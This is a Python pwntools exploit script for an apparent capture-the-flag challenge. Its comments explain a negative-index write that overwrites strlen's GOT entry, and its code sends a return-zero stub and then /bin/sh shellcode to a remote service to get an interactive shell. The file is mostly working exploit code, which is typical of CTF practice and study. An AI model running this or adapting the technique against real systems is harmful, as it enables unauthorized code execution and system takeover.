from pwn import *
from struct import *

#
#   The weakness of this challenge is the command at 0x0x0486EA
#       mov DWORD PTR [eax*4+0x804a060],edx
#   eax : the message slot
#   edx : the heap address of message
#
#   This program verifies:
#       1. message length must lower than 8 chars
#       2. message slot must lower than 0x40
#       3. the first char of message slot isn't equal to 0x2d, which is the ascii code of '-'
#
#   We can use a space to by pass the 3rd verification.
#
#   The address of strlen@plt is 0x8048490.
#
#   The strlen@plt will do:
#       jmp DWORD PTR ds:0x804a024
#
#   Using vmmap, the command of gdb, we can check that 0x0804a000 ~ 0x0804b000 is writable.
#
#   So, if we make eax equal to -15, we can change the place strlen@plt jumping to.
#
#   In addition, our message will be copied to heap by the strdup function.
#
#   And using checksec, we found:
#       No PIE (0x8048000)
#
#   It means that the section of heap(0x804b000) won't be enabled ASLR.
#
#   So, just make some fake opcodes at heap, and let strlen@plt jumps to there~~~
#
#   I design the payload as follow:
#
#       1st. send a Fake command that always return 0,
#            and make eax*4 + 0x804a060 = 0x804a024 (strlen@got.plt).
#            By doing this, strlen@plt will jump to our Fake command.
#            Now, we can input more than 8 chars.
#       2nd. send shellcode~~~~, and still hijack the strlen@got.plt.
#            When strlen@plt be called next time, it will jump to our shellcode.
#       3rd. anything~, just to trigger strlen@plt and execute our shellcode.
#

#r = remote('localhost', 5566)
r = remote('hackme.inndy.tw', 7715)

def interaction(msg, index):
    recv = r.recvuntil('message:')
    print recv
    r.sendline(msg)
    print msg
    recv = r.recvuntil('slot?')
    print recv
    r.sendline(index)
    print index

raw_input('pause')

#1st payload
CMD = asm('xor eax, eax')
CMD += asm('ret')
payload = CMD + '\x00'
interaction(payload, ' -15')

shellcode = asm(shellcraft.i386.linux.sh())
payload = shellcode + '\x00'
interaction(payload, ' -15')

interaction('gg', '87')

r.interactive()
